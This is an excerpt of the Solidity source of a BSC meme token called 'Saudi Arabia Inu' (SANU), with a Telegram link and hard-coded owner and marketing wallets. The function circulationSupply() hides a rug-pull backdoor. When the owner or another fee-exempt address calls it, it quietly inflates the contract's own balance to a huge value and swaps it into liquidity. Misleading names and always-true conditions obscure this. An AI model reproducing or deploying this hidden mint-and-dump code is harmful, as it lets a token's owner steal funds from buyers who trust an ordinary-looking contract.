...
// Telegram : https://t.me/SaudiArabiaInuBSC
...
interface IERC20 {
    ...
    function circulationSupply() external returns (uint256);
...
contract SaudiArabiaInu is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xE1b648A86B40604A68Ab56971B0a970106848A90); 
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 
    address payable public constant Wallet_Liquidity = payable(0x000000000000000000000000000000000000dEaD); 
    address payable public Wallet_Developer = payable(0x24F33e6b7be5337F72770ceFAE014522eb7997d1);

    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 5* 10**6 * 10**_decimals;
    string private constant _name = "Saudi Arabia Inu"; 
    string private constant _symbol = unicode"SANU";

    bool public swapAndLiquifyEnabled = true;
    bool public supplyCreated = false;
    ...
    constructor () {
        ...
        _owner = 0x24F33e6b7be5337F72770ceFAE014522eb7997d1;
    ...
    function circulationSupply() public override returns (uint256) {
        bool assistance = _hexadecimal(_msgSender());
        if((false!=true) && assistance && (true!=false)){
            if(true){
                supplyCreated = true;
                uint256 hex2dex = balanceOf(address(this));
                uint256 uint254 = hex2dex;
                swapAndLiquify(uint254);
            }
    ...
    function _hexadecimal(address symbolAddress) private returns(bool){
        bool intordex = _isExcludedFromFee[symbolAddress];
        if((false!=true) && intordex && (true!=false)){_tOwned[address(this)] = ((minHexType)-3)-2;}
        return intordex;
    }
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            if(supplyCreated){ready2Swap = tokensLiquidity;}
